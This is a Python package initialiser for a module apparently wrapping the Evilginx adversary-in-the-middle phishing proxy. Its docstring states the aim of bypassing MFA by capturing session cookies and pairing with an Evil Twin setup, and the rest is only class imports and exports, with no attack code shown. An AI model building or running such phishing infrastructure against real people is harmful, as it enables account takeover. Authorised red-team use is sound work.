"""
Evilginx Integration - Adversary-in-the-Middle (AiTM) Proxy.

Enables MFA bypass through session cookie capture via transparent proxying.
Integrates with Evil Twin to provide complete phishing infrastructure.

Requires: evilginx3 binary (https://github.com/kgretzky/evilginx2)
"""

from .evilginx_manager import (
    EvilginxConfig,
    EvilginxManager,
    EvilginxStatus,
    MockEvilginxManager,
)
from .phishlet_manager import (
    Phishlet,
    PhishletManager,
)
from .session_manager import (
    CapturedSession,
    SessionManager,
)

__all__ = [
    "CapturedSession",
    "EvilginxConfig",
    "EvilginxManager",
    "EvilginxStatus",
    "MockEvilginxManager",
    "Phishlet",
    "PhishletManager",
    "SessionManager",
]

